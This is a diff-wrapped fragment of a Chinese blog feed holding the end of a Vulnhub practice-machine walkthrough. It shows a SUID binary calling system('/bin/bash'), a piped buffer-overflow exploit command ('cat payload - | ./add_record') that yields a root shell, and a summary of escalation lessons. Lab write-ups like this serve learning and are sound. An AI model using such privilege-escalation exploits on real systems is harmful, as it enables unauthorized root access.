+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104448.png" /></p>
+<p>该函数执行完毕之后取得suid权限。然后注意单步执行到下图：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105131.png" /></p>
+<p>将<code>/bin/bash</code>写入到EAX寄存器，然后调用<code>system</code>函数去执行EAX中的指令，这样得到的结果就是root权限的shell。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105554.png" /></p>
+<p>（管道符前面的减号的意思是将payload中的内容作为标准输入输出。）</p>
+<p>成功获得root权限，这台靶机到此就全部结束了。</p>
+<h1 id="总结">总结</h1>
+<p>这台靶机难度很大，涉及到了<strong>缓冲区溢出漏洞</strong>，这是我第一次见识到这种漏洞，因此可能存在着错误。</p>
+<p>Linux提权中优先考虑：内核漏洞、SUID、SUDO配置。但是这台靶机将SUID和缓冲区溢出漏洞结合在一起。这为提权带来了一种思路！</p>
+<p>如果http服务存在着注册功能点，一定要尝试一下，看一些登陆进去的界面是否存在着漏洞！但是，千万别写真实的个人信息。</p>
+<p>遇到新的技术——XMLRPC，需要快速的掌握其工作原理。</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>XMLRPC命令执行</tag>
+        <tag>缓冲区溢出漏洞</tag>
+        <tag>动态调试</tag>
       </tags>
   </entry>
   <entry>
